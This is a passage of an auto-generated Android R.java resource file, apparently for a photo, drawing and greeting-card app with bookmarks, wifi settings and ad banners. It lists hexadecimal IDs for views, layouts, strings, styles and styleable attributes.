appbrainbanner1=0x7f07008f;     public static final int appicon_btn=0x7f070117;     public static final int apply_button=0x7f070153;     public static final int apply_button2=0x7f07014b;     public static final int apply_layout=0x7f070152;     public static final int apply_layout2=0x7f07014a;     public static final int auto_update_prompt=0x7f07018b;     public static final int back_btn=0x7f07003c;     public static final int back_button=0x7f070046;     public static final int back_draw_btn=0x7f07011d;     public static final int back_erase_btn=0x7f070125;     public static final int back_message_btn=0x7f070130;     public static final int back_new_btn=0x7f070129;     public static final int back_page_button=0x7f07004d;     public static final int back_share_btn=0x7f070120;     public static final int back_text_btn=0x7f070111;     public static final int bannerView=0x7f07008c;     public static final int bgnd1=0x7f0700dd;     public static final int bgnd2=0x7f0700de;     public static final int bgnd3=0x7f0700df;     public static final int bgnd4=0x7f0700e0;     public static final int bgnd5=0x7f0700e1;     public static final int bgnd_text=0x7f0700d9;     public static final int blue_seek=0x7f07015c;     public static final int body_layout=0x7f0701c6;     public static final int bold_button=0x7f0700b5;     public static final int bookmarkFavIcon=0x7f070012;     public static final int bookmarkFlag=0x7f070011;     public static final int bookmarkLastVisit=0x7f07000e;     public static final int bookmarkTitle=0x7f07000b;     public static final int bookmarkURL=0x7f07000c;     public static final int bookmarkVisitCount=0x7f070010;     public static final int border_btn=0x7f070145;     public static final int border_layout=0x7f070149;     public static final int borderwidth_seek=0x7f07014f;     public static final int bottom_layout=0x7f070089;     public static final int bright_contrast_seeks=0x7f070156;     public static final int bright_seek=0x7f070157;     public static final int brightness_btn=0x7f070143;     public static final int browser=0x7f070017;     public static final int brush_layout=0x7f070131;     public static final int bubble_display=0x7f0700ba;     public static final int bubble_gallery=0x7f0700fb;     public static final int bubble_layout=0x7f0700fa;     public static final int buttonLayout=0x7f070004;     public static final int button_layout=0x7f070079;     public static final int camera360_btn=0x7f0700e9;     public static final int cancelButton=0x7f07019d;     public static final int cancel_button=0x7f07001c;     public static final int canvas_btn=0x7f0700da;     public static final int canvas_layout=0x7f07013f;     public static final int captionLastVisit=0x7f07000d;     public static final int captionVisitCount=0x7f07000f;     public static final int center_button=0x7f0700b3;     public static final int channelList=0x7f070038;     public static final int checkbox_auto_update=0x7f07018a;     public static final int chk_hide=0x7f070027;     public static final int chkeditor=0x7f070183;     public static final int choosecanvas_btn=0x7f070140;     public static final int chooseframe_btn=0x7f070141;     public static final int christmas_btn=0x7f07011b;     public static final int clearButton1=0x7f070193;     public static final int clearButton2=0x7f070197;     public static final int clearButton3=0x7f07019b;     public static final int clear_button=0x7f070007;     public static final int clear_text_btn=0x7f07009b;     public static final int closeButton=0x7f070005;     public static final int close_button=0x7f070016;     public static final int color_black=0x7f0700cf;     public static final int color_black2=0x7f07010f;     public static final int color_blue=0x7f0700ca;     public static final int color_blue2=0x7f07010a;     public static final int color_brown=0x7f0700bf;     public static final int color_brown2=0x7f070101;     public static final int color_btn=0x7f0700ef;     public static final int color_custom1=0x7f0700c6;     public static final int color_custom2=0x7f0700d1;     public static final int color_custom_border=0x7f07014d;     public static final int color_darkcream=0x7f0700c9;     public static final int color_darkcream2=0x7f070109;     public static final int color_darkskin=0x7f0700c8;     public static final int color_darkskin2=0x7f070108;     public static final int color_gold=0x7f0700d0;     public static final int color_gold2=0x7f070110;     public static final int color_green=0x7f0700c3;     public static final int color_green2=0x7f070105;     public static final int color_grey=0x7f0700ce;     public static final int color_grey2=0x7f07010e;     public static final int color_lightblue=0x7f0700c4;     public static final int color_lightblue2=0x7f070106;     public static final int color_lightcream=0x7f0700be;     public static final int color_lightcream2=0x7f070100;     public static final int color_lightskin=0x7f0700bd;     public static final int color_lightskin2=0x7f0700ff;     public static final int color_orange=0x7f0700c1;     public static final int color_orange2=0x7f070103;     public static final int color_picker1=0x7f0700c7;     public static final int color_picker2=0x7f0700d2;     public static final int color_picker_border=0x7f07014e;     public static final int color_pink=0x7f0700cc;     public static final int color_pink2=0x7f07010c;     public static final int color_purple=0x7f0700cb;     public static final int color_purple2=0x7f07010b;     public static final int color_red=0x7f0700c0;     public static final int color_red2=0x7f070102;     public static final int color_seeks=0x7f070159;     public static final int color_silver=0x7f0700c5;     public static final int color_silver2=0x7f070107;     public static final int color_white=0x7f0700cd;     public static final int color_white2=0x7f07010d;     public static final int color_yellow=0x7f0700c2;     public static final int color_yellow2=0x7f070104;     public static final int colors_layout=0x7f0700bc;     public static final int container=0x7f070072;     public static final int contrast_seek=0x7f070158;     public static final int crop_btn=0x7f07017f;     public static final int curve_btn=0x7f070144;     public static final int delete_button=0x7f070092;     public static final int delete_layout=0x7f0701c4;     public static final int description_text=0x7f070019;     public static final int detail=0x7f070091;     public static final int domain_prompt=0x7f07005d;     public static final int draw_btn=0x7f0700f2;     public static final int draw_layout=0x7f070114;     public static final int drawing=0x7f0700f9;     public static final int drawingFrame=0x7f0700d6;     public static final int drawing_button=0x7f0700d3;     public static final int edit_layout=0x7f0701c1;     public static final int editor_button=0x7f07006e;     public static final int edittext=0x7f07009a;     public static final int effect_black=0x7f07015f;     public static final int effect_boost_1=0x7f070160;     public static final int effect_boost_2=0x7f070161;     public static final int effect_boost_3=0x7f070162;     public static final int effect_brightness=0x7f070163;     public static final int effect_btn=0x7f07013d;     public static final int effect_color_blue=0x7f070164;     public static final int effect_color_depth_32=0x7f070167;     public static final int effect_color_depth_64=0x7f070168;     public static final int effect_color_green=0x7f070165;     public static final int effect_color_red=0x7f070166;     public static final int effect_contrast=0x7f070169;     public static final int effect_emboss=0x7f07016a;     public static final int effect_engrave=0x7f07016b;     public static final int effect_flea=0x7f07016c;     public static final int effect_gamma=0x7f07016d;     public static final int effect_gaussian_blue=0x7f07016e;     public static final int effect_grayscale=0x7f07016f;     public static final int effect_hue=0x7f070170;     public static final int effect_invert=0x7f070171;     public static final int effect_layout=0x7f070150;     public static final int effect_mean_remove=0x7f070172;     public static final int effect_name=0x7f070151;     public static final int effect_none=0x7f07015e;     public static final int effect_reflection=0x7f070173;     public static final int effect_round_corner=0x7f070174;     public static final int effect_saturation=0x7f070175;     public static final int effect_seek=0x7f070155;     public static final int effect_sepia=0x7f070176;     public static final int effect_sepia_blue=0x7f070177;     public static final int effect_sepia_green=0x7f070178;     public static final int effect_sheding_cyan=0x7f070179;     public static final int effect_sheding_green=0x7f07017a;     public static final int effect_sheding_yellow=0x7f07017b;     public static final int effect_smooth=0x7f07017c;     public static final int effect_tint=0x7f07017d;     public static final int effect_watermark=0x7f07017e;     public static final int emotion_btn=0x7f0700e8;     public static final int emotion_layout=0x7f0700e7;     public static final int erase_btn=0x7f070122;     public static final int erase_layout=0x7f070121;     public static final int eraseall_btn=0x7f070123;     public static final int exit_btn=0x7f07012c;     public static final int exit_button=0x7f0701b1;     public static final int exit_layout=0x7f07012a;     public static final int expanded_image=0x7f070073;     public static final int file_type_prompt=0x7f07005a;     public static final int flickr_btn=0x7f0700dc;     public static final int frame_btn=0x7f07013b;     public static final int frame_button=0x7f070085;     public static final int frame_layout=0x7f070084;     public static final int frame_text=0x7f07013a;     public static final int frameopacity_btn=0x7f070142;     public static final int frameopacity_layout=0x7f070146;     public static final int frameopacity_seek=0x7f070147;     public static final int gadget_btn=0x7f0700ec;     public static final int gadget_gallery=0x7f070139;     public static final int gadget_layout=0x7f07003a;     public static final int gallery1=0x7f07003b;     public static final int gallery2=0x7f07003e;     public static final int gallery3=0x7f07003f;     public static final int gallery4=0x7f070040;     public static final int gallery5=0x7f070041;     public static final int gallery6=0x7f0700e2;     public static final int gallery_button=0x7f07007d;     public static final int gallery_layout=0x7f07007c;     public static final int gif1=0x7f070055;     public static final int gift_btn=0x7f070118;     public static final int go_to_clear_button=0x7f07005e;     public static final int go_to_dismiss_button=0x7f07005f;     public static final int go_to_go_button=0x7f070060;     public static final int go_to_url_field=0x7f070058;     public static final int googleimage_btn=0x7f07011a;     public static final int green_seek=0x7f07015b;     public static final int greeting_layout=0x7f070137;     public static final int grid=0x7f070009;     public static final int gridview=0x7f070039;     public static final int hdwallpaper_layout=0x7f0701b7;     public static final int head_layout=0x7f070078;     public static final int help_btn=0x7f07012b;     public static final int help_button=0x7f070087;     public static final int help_layout=0x7f070086;     public static final int hide_keyboard_btn=0x7f07009c;     public static final int history_btn=0x7f0700ee;     public static final int horizontalScrollView=0x7f07015d;     public static final int howto1_button=0x7f070020;     public static final int howto1_text=0x7f07001f;     public static final int howto2_button=0x7f07001e;     public static final int howto2_text=0x7f07001d;     public static final int howto3_button=0x7f070022;     public static final int howto3_text=0x7f070021;     public static final int howto4_button=0x7f070024;     public static final int howto4_text=0x7f070023;     public static final int howto5_button=0x7f070026;     public static final int howto5_text=0x7f070025;     public static final int howto_button=0x7f070081;     public static final int icon=0x7f070063;     public static final int imAdview=0x7f07008e;     public static final int imageBgnd=0x7f0700d7;     public static final int imageCanvas=0x7f07013e;     public static final int imageFrame=0x7f07003d;     public static final int imageSwitcher1=0x7f070053;     public static final int imageView=0x7f0700d8;     public static final int image_preview=0x7f0700fe;     public static final int image_search=0x7f070030;     public static final int image_view=0x7f070056;     public static final int img=0x7f07000a;     public static final int img_cartoon=0x7f070097;     public static final int instruction_layout=0x7f070049;     public static final int instruction_text=0x7f07004a;     public static final int intercept_layout=0x7f070088;     public static final int italic_button=0x7f0700b6;     public static final int keyword_type_prompt=0x7f07005b;     public static final int large_brush=0x7f070015;     public static final int large_erase=0x7f07002e;     public static final int large_pattern=0x7f070188;     public static final int large_point=0x7f070135;     public static final int largest_point=0x7f070136;     public static final int later_button=0x7f0701af;     public static final int layout=0x7f070042;     public static final int layout_bookmark=0x7f07002f;     public static final int left_button=0x7f070052;     public static final int line_btn=0x7f070115;     public static final int linegallery_btn=0x7f070116;     public static final int mainLayout=0x7f070045;     public static final int maxmode=0x7f070035;     public static final int medium_brush=0x7f070014;     public static final int medium_erase=0x7f07002d;     public static final int medium_pattern=0x7f070187;     public static final int medium_point=0x7f070134;     public static final int message_btn=0x7f07012e;     public static final int message_layout=0x7f07012d;     public static final int min_quake_mag_prompt=0x7f07018c;     public static final int modedatedesc=0x7f070033;     public static final int modehorizontal=0x7f070182;     public static final int modeinteresting=0x7f070034;     public static final int modemax100=0x7f070037;     public static final int modemax50=0x7f070036;     public static final int moderelevant=0x7f070032;     public static final int modevertical=0x7f070181;     public static final int momentcam_btn=0x7f0700e6;     public static final int momentcam_button=0x7f07007b;     public static final int momentcam_layout=0x7f07007a;     public static final int momentcamalbum_button=0x7f070067;     public static final int momentcamalbum_layout=0x7f070066;     public static final int momentcamgallery_button=0x7f07006a;     public static final int momentcamgallery_layout=0x7f070068;     public static final int momentcamplay_button=0x7f07004b;     public static final int more_layout=0x7f0701b9;     public static final int moreprogram_button=0x7f070083;     public static final int moreprogram_layout=0x7f070082;     public static final int morewallpaper_button=0x7f0700e3;     public static final int mygallery_btn=0x7f0700ea;     public static final int new_btn=0x7f070127;     public static final int new_image=0x7f07006d;     public static final int new_image_layout=0x7f07006c;     public static final int new_layout=0x7f070126;     public static final int next_button=0x7f070061;     public static final int next_page_button=0x7f07004f;     public static final int no_button=0x7f0701b0;     public static final int noapply_button=0x7f070154;     public static final int noapply_button2=0x7f07014c;     public static final int nobubble_gallery=0x7f0700fd;     public static final int nobubble_layout=0x7f0700fc;     public static final int noframe_btn=0x7f07013c;     public static final int nomessage_btn=0x7f07012f;     public static final int notification_picture=0x7f070029;     public static final int notification_subtitle=0x7f07002b;     public static final int notification_title=0x7f07002a;     public static final int notificationbg=0x7f070028;     public static final int okButton=0x7f07019c;     public static final int opacity_btn=0x7f0700f3;     public static final int opacity_layout=0x7f070148;     public static final int opacity_seek=0x7f0700d4;     public static final int open_button=0x7f070051;     public static final int opq_ok=0x7f070185;     public static final int opq_txt=0x7f070184;     public static final int orientationmode=0x7f070180;     public static final int page10_text=0x7f0701a9;     public static final int page11_text=0x7f0701aa;     public static final int page12_text=0x7f0701ab;     public static final int page13_text=0x7f0701ac;     public static final int page1_text=0x7f0701a0;     public static final int page2_text=0x7f0701a1;     public static final int page3_text=0x7f0701a2;     public static final int page4_text=0x7f0701a3;     public static final int page5_text=0x7f0701a4;     public static final int page6_text=0x7f0701a5;     public static final int page7_text=0x7f0701a6;     public static final int page8_text=0x7f0701a7;     public static final int page9_text=0x7f0701a8;     public static final int page_gallery=0x7f07004e;     public static final int page_layout=0x7f07004c;     public static final int paint_btn=0x7f070065;     public static final int paint_button=0x7f070094;     public static final int paint_layout=0x7f0701c2;     public static final int parent_layout2=0x7f0700f8;     public static final int pattern_btn=0x7f0700f0;     public static final int pattern_gallery=0x7f070113;     public static final int pattern_layout=0x7f070112;     public static final int photoframe_layout=0x7f0701b8;     public static final int pickgallery_btn=0x7f0700eb;     public static final int pixabay_btn=0x7f0700db;     public static final int play_button=0x7f070095;     public static final int progressBar1=0x7f070076;     public static final int progress_layout=0x7f070062;     public static final int prompt_input_field=0x7f070075;     public static final int prompt_message_text=0x7f070074;     public static final int quote_btn=0x7f070119;     public static final int quote_btn2=0x7f07011c;     public static final int radiomode=0x7f070031;     public static final int rate_layout=0x7f0701b6;     public static final int recent_update_prompt=0x7f07005c;     public static final int record_btn=0x7f0701ba;     public static final int red_seek=0x7f07015a;     public static final int refresh_btn=0x7f070071;     public static final int relative_checkbox=0x7f070189;     public static final int relative_ssid1=0x7f070191;     public static final int relative_ssid2=0x7f070195;     public static final int relative_ssid3=0x7f070199;     public static final int reload_btn=0x7f070048;     public static final int reload_button=0x7f07007e;     public static final int reload_layout=0x7f07019e;     public static final int reload_text=0x7f07019f;     public static final int reloaddate=0x7f0701ad;     public static final int remove_button=0x7f070138;     public static final int resize_btn=0x7f070128;     public static final int right_button=0x7f070054;     public static final int save_btn=0x7f07011f;     public static final int save_button=0x7f07001b;     public static final int save_item_page_button=0x7f0701b5;     public static final int save_layout=0x7f0700d5;     public static final int scroll_layout=0x7f0701b3;     public static final int search_button=0x7f070008;     public static final int search_field=0x7f0701b2;     public static final int search_prompt=0x7f070077;     public static final int search_text=0x7f070006;     public static final int search_type_prompt=0x7f070059;     public static final int secondBottomBanner=0x7f07008b;     public static final int setting_button=0x7f07006b;     public static final int share_btn=0x7f070057;     public static final int share_button=0x7f070044;     public static final int share_layout=0x7f07011e;     public static final int showopacity_btn=0x7f070124;     public static final int size_seek=0x7f0700b2;     public static final int small_brush=0x7f070013;     public static final int small_erase=0x7f07002c;     public static final int small_pattern=0x7f070186;     public static final int small_point=0x7f070133;     public static final int smallest_point=0x7f070132;     public static final int speech_gallery=0x7f0700b7;     public static final int spinner_item_page=0x7f0701b4;     public static final int spinner_min_level=0x7f07018d;     public static final int spinner_update_freq=0x7f07018f;     public static final int ssid_filter1=0x7f070192;     public static final int ssid_filter1_prompt=0x7f070190;     public static final int ssid_filter2=0x7f070196;     public static final int ssid_filter2_prompt=0x7f070194;     public static final int ssid_filter3=0x7f07019a;     public static final int ssid_filter3_prompt=0x7f070198;     public static final int startAppBanner=0x7f070018;     public static final int switch_button=0x7f070080;     public static final int tapcontext_application_icon_image_view=0x7f0701c0;     public static final int tapcontext_background_view=0x7f0701bb;     public static final int tapcontext_content_text_view=0x7f0701bf;     public static final int tapcontext_extra_content_text_view=0x7f0701be;     public static final int tapcontext_icon_image_view=0x7f0701bc;     public static final int tapcontext_title_text_view=0x7f0701bd;     public static final int text=0x7f0701c5;     public static final int text1=0x7f070043;     public static final int text_btn=0x7f0700ed;     public static final int text_display=0x7f0700bb;     public static final int text_layout=0x7f070099;     public static final int textstyle1=0x7f0700a4;     public static final int textstyle10=0x7f0700ad;     public static final int textstyle11=0x7f0700ae;     public static final int textstyle12=0x7f0700af;     public static final int textstyle13=0x7f0700b0;     public static final int textstyle14=0x7f0700b1;     public static final int textstyle2=0x7f0700a5;     public static final int textstyle3=0x7f0700a6;     public static final int textstyle4=0x7f0700a7;     public static final int textstyle5=0x7f0700a8;     public static final int textstyle6=0x7f0700a9;     public static final int textstyle7=0x7f0700aa;     public static final int textstyle8=0x7f0700ab;     public static final int textstyle9=0x7f0700ac;     public static final int textstyle_chinesetakeaway=0x7f0700a0;     public static final int textstyle_go3v2=0x7f0700a1;     public static final int textstyle_kato=0x7f0700a2;     public static final int textstyle_manga=0x7f0700a3;     public static final int textstyle_mponderosa=0x7f07009e;     public static final int textstyle_rosewood=0x7f07009d;     public static final int textstyle_shanghai=0x7f07009f;     public static final int title=0x7f070090;     public static final int top_erase_btn=0x7f0700f1;     public static final int top_exit_btn=0x7f0700f7;     public static final int top_layout=0x7f070096;     public static final int top_message_btn=0x7f0700f5;     public static final int top_message_layout=0x7f0700f4;     public static final int top_new_btn=0x7f0700e5;     public static final int top_new_layout=0x7f0700e4;     public static final int top_share_btn=0x7f0700f6;     public static final int update_freq_prompt=0x7f07018e;     public static final int vfTopBanner=0x7f07008a;     public static final int view_button=0x7f07007f;     public static final int wallpaper_button=0x7f0701c3;     public static final int xappad_bannerview=0x7f0701c8;     public static final int xappad_bannerviewimg=0x7f0701c9;     public static final int xappad_bannerviewtext=0x7f0701ca;     public static final int xappad_customtextview=0x7f0701cb;     public static final int xappad_customtextviewcta=0x7f0701cd;     public static final int xappad_customtextviewdescription=0x7f0701ce;     public static final int xappad_customtextviewsmalltext=0x7f0701cf;     public static final int xappad_customtextviewtitle=0x7f0701cc;     public static final int xappad_mainview=0x7f0701c7;     public static final int xspacing_seek=0x7f0700b8;     public static final int yborder_seek=0x7f0700b9;     public static final int yes_button=0x7f0701ae;     public static final int yspacing_seek=0x7f0700b4;     public static final int zoom_btn=0x7f070064;     public static final int zoom_button=0x7f070093;   } public static final class integer {     public static final int large_size=0x7f0a0003;     public static final int largest_size=0x7f0a0004;     public static final int medium_size=0x7f0a0002;     public static final int small_size=0x7f0a0001;     public static final int smallest_size=0x7f0a0000;   } public static final class layout {     public static final int bookmark_grid_dialog=0x7f030000;     public static final int bookmark_item=0x7f030001;     public static final int brush_chooser=0x7f030002;     public static final int christmas_dialog=0x7f030003;     public static final int comment_dialog=0x7f030004;     public static final int confirm_dialog3=0x7f030005;     public static final int custom_bar_notification=0x7f030006;     public static final int erase_chooser=0x7f030007;     public static final int flickr_dialog=0x7f030008;     public static final int gadget_dialog=0x7f030009;     public static final int gadget_dialog2=0x7f03000a;     public static final int gallery_dialog2=0x7f03000b;     public static final int gallery_layout=0x7f03000c;     public static final int gallery_layout2=0x7f03000d;     public static final int gallery_layout3=0x7f03000e;     public static final int gallery_layout4=0x7f03000f;     public static final int gif_view_dialog=0x7f030010;     public static final int gift_dialog=0x7f030011;     public static final int giftdownload_dialog=0x7f030012;     public static final int go_to_dialog=0x7f030013;     public static final int google_image_dialog=0x7f030014;     public static final int grid=0x7f030015;     public static final int grid_item=0x7f030016;     public static final int grid_item2=0x7f030017;     public static final int history_item=0x7f030018;     public static final int home=0x7f030019;     public static final int icon_list_dialog=0x7f03001a;     public static final int item=0x7f03001b;     public static final int javascript_prompt_dialog=0x7f03001c;     public static final int line_dialog=0x7f03001d;     public static final int line_list_dialog=0x7f03001e;     public static final int loading_layout=0x7f03001f;     public static final int main=0x7f030020;     public static final int menu_item=0x7f030021;     public static final int menu_item_gadget=0x7f030022;     public static final int menu_item_icon=0x7f030023;     public static final int menu_item_white2=0x7f030024;     public static final int menu_item_white3=0x7f030025;     public static final int menu_item_white4=0x7f030026;     public static final int menu_item_white5=0x7f030027;     public static final int menu_item_white6=0x7f030028;     public static final int menu_item_white_bgnd=0x7f030029;     public static final int menu_item_wood=0x7f03002a;     public static final int momentcam_dialog=0x7f03002b;     public static final int multiline_text_dialog=0x7f03002c;     public static final int new_add_dialog=0x7f03002d;     public static final int new_background_resize_dialog=0x7f03002e;     public static final int new_background_touch_dialog=0x7f03002f;     public static final int new_camera360_list_dialog=0x7f030030;     public static final int new_chooseframe_dialog=0x7f030031;     public static final int new_drawing_dialog=0x7f030032;     public static final int new_emotion_list_dialog=0x7f030033;     public static final int new_flickr_dialog=0x7f030034;     public static final int new_frame_touch_dialog=0x7f030035;     public static final int new_gadgetdownload_dialog=0x7f030036;     public static final int new_google_touch_dialog=0x7f030037;     public static final int new_momentcam_album_list_dialog=0x7f030038;     public static final int new_momentcam_gallery_list_dialog=0x7f030039;     public static final int new_pattern_dialog2=0x7f03003a;     public static final int new_pixabay_dialog=0x7f03003b;     public static final int opacity_chooser=0x7f03003c;     public static final int pattern_chooser=0x7f03003d;     public static final int pattern_dialog=0x7f03003e;     public static final int photoshop_dialog=0x7f03003f;     public static final int pixabay_dialog=0x7f030040;     public static final int preference=0x7f030041;     public static final int quote_dialog=0x7f030042;     public static final int quote_list_dialog=0x7f030043;     public static final int rate_dialog=0x7f030044;     public static final int search_dialog=0x7f030045;     public static final int setting_layout=0x7f030046;     public static final int snapshot_dialog=0x7f030047;     public static final int snapshot_list_dialog=0x7f030048;     public static final int splash=0x7f030049;     public static final int tab_indicator=0x7f03004a;     public static final int tapcontext_notification_layout=0x7f03004b;     public static final int touch_dialog=0x7f03004c;     public static final int touch_dialog2=0x7f03004d;     public static final int touch_dialog3=0x7f03004e;     public static final int web_dialog=0x7f03004f;     public static final int xappad_notification=0x7f030050;   } public static final class raw {     public static final int changelog_eng=0x7f050000;     public static final int help_eng=0x7f050001;     public static final int help_thai=0x7f050002;     public static final int new_quotes=0x7f050003;     public static final int popular_quotes=0x7f050004;   } public static final class string {     public static final int action_settings=0x7f0b0003;     public static final int activity_browser=0x7f0b0068;     public static final int activity_preference=0x7f0b0067;     public static final int all_wifi=0x7f0b004b;     public static final int app_logo_bottom=0x7f0b0016;     public static final int app_logo_top=0x7f0b0015;     public static final int app_name=0x7f0b0011;     public static final int app_version_info=0x7f0b0017;     public static final int brush=0x7f0b0006;     public static final int button_browse=0x7f0b005e;     public static final int button_cancel=0x7f0b0059;     public static final int button_clear=0x7f0b0058;     public static final int button_close=0x7f0b005b;     public static final int button_help_eng=0x7f0b0050;     public static final int button_help_thai=0x7f0b0051;     public static final int button_no=0x7f0b005c;     public static final int button_ok=0x7f0b0056;     public static final int button_save=0x7f0b0057;     public static final int button_search=0x7f0b005d;     public static final int button_yes=0x7f0b005a;     public static final int color=0x7f0b0007;     public static final int dialog_help_eng=0x7f0b004e;     public static final int dialog_help_thai=0x7f0b004f;     public static final int erase=0x7f0b0008;     public static final int exit=0x7f0b0096;     public static final int gender_female=0x7f0b0091;     public static final int gender_male=0x7f0b0090;     public static final int gender_neutral=0x7f0b0092;     public static final int hello_world=0x7f0b0004;     public static final int help=0x7f0b0014;     public static final int known_wifi=0x7f0b004d;     public static final int lrg=0x7f0b000e;     public static final int lrgest=0x7f0b000f;     public static final int med=0x7f0b000d;     public static final int menu=0x7f0b002b;     public static final int menu_add_instant=0x7f0b0031;     public static final int menu_addbookmark=0x7f0b0049;     public static final int menu_back=0x7f0b003b;     public static final int menu_browse=0x7f0b0030;     public static final int menu_cancel=0x7f0b0038;     public static final int menu_capture=0x7f0b002a;     public static final int menu_copy=0x7f0b001e;     public static final int menu_current=0x7f0b002f;     public static final int menu_delete_bookmark=0x7f0b0027;     public static final int menu_delete_image=0x7f0b0053;     public static final int menu_design=0x7f0b00a0;     public static final int menu_disable=0x7f0b0033;     public static final int menu_dismiss=0x7f0b0041;     public static final int menu_download=0x7f0b0045;     public static final int menu_enable=0x7f0b0032;     public static final int menu_exit=0x7f0b003c;     public static final int menu_gallery=0x7f0b0052;     public static final int menu_go_to=0x7f0b0043;     public static final int menu_goto=0x7f0b0042;     public static final int menu_help=0x7f0b0035;     public static final int menu_help_eng=0x7f0b0036;     public static final int menu_help_thai=0x7f0b0037;     public static final int menu_howto1=0x7f0b0022;     public static final int menu_howto2=0x7f0b001f;     public static final int menu_howto3=0x7f0b0020;     public static final int menu_howto4=0x7f0b0021;     public static final int menu_item_help=0x7f0b003f;     public static final int menu_item_play=0x7f0b003d;     public static final int menu_item_scores=0x7f0b003e;     public static final int menu_item_settings=0x7f0b002c;     public static final int menu_more_app=0x7f0b0040;     public static final int menu_more_program=0x7f0b0018;     public static final int menu_moreapp=0x7f0b0024;     public static final int menu_preference=0x7f0b003a;     public static final int menu_rateapp=0x7f0b0023;     public static final int menu_refresh=0x7f0b002d;     public static final int menu_reload=0x7f0b0044;     public static final int menu_remove=0x7f0b0034;     public static final int menu_reset=0x7f0b0029;     public static final int menu_search=0x7f0b0028;     public static final int menu_search_site=0x7f0b0047;     public static final int menu_settings=0x7f0b0046;     public static final int menu_share=0x7f0b0055;     public static final int menu_smart_actions=0x7f0b0048;     public static final int menu_toggle_bookmark=0x7f0b002e;     public static final int menu_update_bookmark=0x7f0b004a;     public static final int menu_update_thumbnail=0x7f0b0010;     public static final int menu_view_gallery=0x7f0b0025;     public static final int menu_view_list=0x7f0b0026;     public static final int menu_wallpaper=0x7f0b009e;     public static final int menu_wifi_setting=0x7f0b0039;     public static final int menu_zoom=0x7f0b009f;     public static final int message_18_older=0x7f0b006c;     public static final int message_18_older_title=0x7f0b006b;     public static final int message_ads_not_complete=0x7f0b0074;     public static final int message_filter_keyword=0x7f0b006e;     public static final int message_minimum_level=0x7f0b006d;     public static final int message_no_thumbnail=0x7f0b0075;     public static final int message_wifi_required=0x7f0b0069;     public static final int message_wifi_required_title=0x7f0b006a;     public static final int no=0x7f0b0094;     public static final int no_questions=0x7f0b0095;     public static final int no_scores=0x7f0b0076;     public static final int paint=0x7f0b000a;     public static final int picture_frame=0x7f0b00a1;     public static final int pref_auto_update=0x7f0b005f;     public static final int pref_min_level=0x7f0b0061;     public static final int pref_ssid_filter1=0x7f0b0062;     public static final int pref_ssid_filter2=0x7f0b0063;     public static final int pref_ssid_filter3=0x7f0b0064;     public static final int pref_ssid_filter4=0x7f0b0065;     public static final int pref_ssid_filter5=0x7f0b0066;     public static final int pref_update_freq=0x7f0b0060;     public static final int progress_dialog_init=0x7f0b006f;     public static final int progress_dialog_saving_image=0x7f0b0073;     public static final int progress_dialog_setting_wallpaper=0x7f0b0070;     public static final int progress_dialog_sharing_gif=0x7f0b0072;     public static final int progress_dialog_sharing_image=0x7f0b0071;     public static final int rank=0x7f0b0078;     public static final int save=0x7f0b0009;     public static final int score=0x7f0b0079;     public static final int scores=0x7f0b0013;     public static final int secured_wifi=0x7f0b004c;     public static final int settings=0x7f0b007c;     public static final int settings_bg_color_confirm=0x7f0b0000;     public static final int settings_bg_color_dialog=0x7f0b0002;     public static final int settings_button_dob=0x7f0b0081;     public static final int settings_button_favoriteplace=0x7f0b0087;     public static final int settings_button_favplace_map=0x7f0b008b;     public static final int settings_button_friend_email=0x7f0b009a;     public static final int settings_button_pwd=0x7f0b0082;     public static final int settings_default_color_confirm=0x7f0b0001;     public static final int settings_dob=0x7f0b007f;     public static final int settings_dob_not_set=0x7f0b0080;     public static final int settings_email=0x7f0b007e;     public static final int settings_favoriteplace=0x7f0b0086;     public static final int settings_favoriteplace_not_set=0x7f0b0088;     public static final int settings_favplace_coords=0x7f0b0089;     public static final int settings_favplace_currentlocation=0x7f0b008a;     public static final int settings_friend_email=0x7f0b0097;     public static final int settings_friend_email_label=0x7f0b0098;     public static final int settings_friend_email_tip=0x7f0b0099;     public static final int settings_gender=0x7f0b0083;     public static final int settings_nickname=0x7f0b007d;     public static final int settings_password=0x7f0b0084;     public static final int settings_password2=0x7f0b0085;     public static final int settings_pwd_equal=0x7f0b008f;     public static final int settings_pwd_not_equal=0x7f0b008e;     public static final int settings_pwd_not_set=0x7f0b008d;     public static final int settings_pwd_set=0x7f0b008c;     public static final int sml=0x7f0b000b;     public static final int smlest=0x7f0b000c;     public static final int splash=0x7f0b0012;     public static final int start_new=0x7f0b0005;     public static final int tab_bookmark=0x7f0b001c;     public static final int tab_history=0x7f0b001d;     public static final int tab_media_search=0x7f0b001b;     public static final int tab_search=0x7f0b0019;     public static final int tab_software_search=0x7f0b001a;     public static final int title_dialog_alert=0x7f0b009b;     public static final int title_dialog_confirm=0x7f0b009c;     public static final int title_dialog_prompt=0x7f0b009d;     public static final int title_warning=0x7f0b0054;     public static final int username=0x7f0b0077;     public static final int wait_msg=0x7f0b007a;     public static final int wait_title=0x7f0b007b;     public static final int yes=0x7f0b0093;   } public static final class style {     public static final int AppBaseTheme=0x7f0c0003;     public static final int AppTheme=0x7f0c0004;     public static final int DialogAnimation=0x7f0c0005;     public static final int DialogSlideAnim=0x7f0c0006;     public static final int Dialog_Fullscreen=0x7f0c0001;     public static final int Dialog_Translucent=0x7f0c0002;     public static final int FormTheme=0x7f0c0000;     public static final int Widget_GifMoviewView=0x7f0c0007;   } public static final class styleable {     public static final int AdView_animation=0x00000002;     public static final int AdView_banner_type=0x00000001;     public static final int AdView_canShowMR=0x00000004;     public static final int AdView_placementType=0x00000003;     public static final int AdView_test_mode=0x00000000;     public static final int CustomTheme_gifMoviewViewStyle=0x00000000;     public static final int Gallery1_android_galleryItemBackground=0x00000000;     public static final int GifMoviewView_gif=0x00000000;     public static final int GifMoviewView_paused=0x00000001;     public static final int com_google_ads_AdView_adSize=0x00000000;     public static final int com_google_ads_AdView_adUnitId=0x00000001;     public static final int com_google_ads_AdView_keywords=0x00000002;     public static final int org_zestadz_ads_ZestadzAd_isGoneWithoutAd=0x00000001;     public static final int org_zestadz_ads_ZestadzAd_testing=0;     public static final int[] AdView={R.attr.test_mode,R.attr.banner_type,R.attr.animation,R.attr.placementType,R.attr.canShowMR};     public static final int[] CustomTheme={R.attr.gifMoviewViewStyle};     public static final int[] Gallery1={android.R.attr.galleryItemBackground};     public static final int[] GifMoviewView={R.attr.gif,R.attr.paused};     public static final int[] com_google_ads_AdView={R.attr.adSize,R.attr.adUnitId,R.attr.keywords};     public static final int[] org_zestadz_ads_ZestadzAd={R.attr.testing,R.attr.isGoneWithoutAd};   } } "
